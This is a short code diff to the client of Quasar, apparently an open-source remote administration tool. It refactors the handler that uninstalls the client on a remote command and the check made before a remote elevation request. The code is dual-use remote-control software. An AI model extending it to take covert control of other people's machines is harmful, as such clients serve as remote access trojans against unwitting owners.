@@ -1,4 +1,5 @@
-﻿using Quasar.Client.Config;
+﻿using System;
+using Quasar.Client.Config;
 using Quasar.Client.Helper;
 using Quasar.Client.Networking;
 using Quasar.Client.Setup;
@@ -7,6 +8,8 @@ using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 using System.Diagnostics;
 using System.Windows.Forms;
+using Quasar.Client.User;
+using Quasar.Common.Enums;
 
 namespace Quasar.Client.Messages
 {
@@ -54,8 +57,15 @@ namespace Quasar.Client.Messages
         private void Execute(ISender client, DoClientUninstall message)
         {
             client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
-
-            new ClientUninstaller().Uninstall(client);
+            try
+            {
+                new ClientUninstaller().Uninstall();
+                _client.Exit();
+            }
+            catch (Exception ex)
+            {
+                client.Send(new SetStatus { Message = $"Uninstall failed: {ex.Message}" });
+            }
         }
 
         private void Execute(ISender client, DoClientDisconnect message)
@@ -70,7 +80,8 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, DoAskElevate message)
         {
-            if (WindowsAccountHelper.GetAccountType() != "Admin")
+            var userAccount = new UserAccount();
+            if (userAccount.Type != AccountType.Admin)
             {
                 ProcessStartInfo processStartInfo = new ProcessStartInfo
                 {
